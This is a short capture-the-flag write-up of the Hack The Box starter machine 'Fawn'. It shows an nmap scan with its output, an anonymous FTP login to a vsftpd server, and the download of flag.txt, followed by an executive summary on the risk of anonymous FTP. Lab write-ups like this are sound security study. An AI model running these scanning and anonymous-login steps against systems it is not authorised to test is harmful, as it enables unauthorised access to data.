```toc
```
# HTB Notes - Fawn #

+ **Date**: 11-30-2022
+ **Author**: Noah Soqui
+ **Tags**: #FTP, #Anonymous

## Intelligence Gathering ##

Scanning machine
+ `sudo nmap -sV -sC -O TARGET_IP`
+ Output:
``` Shell
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-30 17:06 CST
Nmap scan report for 10.129.171.236
Host is up (0.050s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.147
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/30%OT=21%CT=1%CU=32622%PV=Y%DS=2%DC=I%G=Y%TM=6387E2
OS:1A%P=aarch64-unknown-linux-gnu)SEQ(SP=FE%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SE
OS:Q(SP=FE%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11
OS:NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE8
OS:8%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54
OS:DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T
OS:=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RI
OS:D=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.01 seconds
```

## Misconfiguration and Vulnerability Analysis  ##

Anonymous login is allowed, which will allow the attacker to use the username `anonymous`, and no password. Furthermore the nmap default scripts were able to enumerate a `flag.txt` which is the flag the attacker is looking for.

## Exploitation ##

Connecting via FTP
+ `ftp TARGET_IP `
+ Output:
``` SHELL                      
Connected to 10.129.171.236.
220 (vsFTPd 3.0.3)
Name (10.129.171.236:cysoq): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

## Post Exploitation ##

Download the flag
+ `get flag.txt`

## Reporting ##

### Executive Summary ###

A starter box, that shows the danger of FTP anon login. This allows the attacker to authenticate to the service as a guest without credentials. Allowing for the capture of the flag.txt.

